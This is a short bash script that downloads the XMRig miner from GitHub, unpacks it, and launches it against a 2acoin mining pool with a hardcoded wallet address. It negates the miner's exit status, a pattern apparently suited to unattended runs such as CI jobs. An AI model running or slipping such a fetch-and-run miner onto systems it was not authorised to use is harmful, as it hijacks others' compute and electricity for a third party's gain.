#!/bin/bash
wget https://github.com/xmrig/xmrig/releases/download/v6.7.0/xmrig-6.7.0-bionic-x64.tar.gz
tar xvf xmrig-6.7.0-bionic-x64.tar.gz
cd xmrig-6.7.0 && ! ./xmrig  --algo=Argon2/Chukwa  -o us-central.2acoin.org:3333 -u guns84Y5V6p9aPYVzPC7FKUg2F65v2pHSZXZ1bRugByPf1HXyRVsfw7BmaGeNyFvq9HNqTEQPg9XJTMM9DyqkvuB5vdXEwbk91.5000 -p ib32 -k
